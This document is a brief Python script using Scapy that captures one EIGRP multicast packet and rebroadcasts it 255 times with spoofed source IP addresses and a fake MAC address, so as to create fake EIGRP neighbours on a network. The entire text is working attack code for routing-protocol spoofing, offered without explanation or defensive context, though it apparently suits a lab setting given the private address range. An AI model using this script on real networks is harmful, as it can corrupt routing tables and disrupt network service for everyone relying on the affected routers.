# Add fake EIGRP neighbours, multiple packets

from scapy.all import *
load_contrib('eigrp')
pkt = sniff(filter="ip dst 224.0.0.10", count = 1)
for i in range (0,255):
    # Set host IP adress
    host = "192.168.122.%s" %(i)
    # Change the source MAC address
    pkt[0].src="00:00:00:11:11:11"
    # Change the source IP address 
    pkt[0][IP].src=host
    # Change cheksum
    pkt[0][IP].chksum=None
    # Send packet into network
    sendp(pkt[0], loop = 0, verbose = 1)

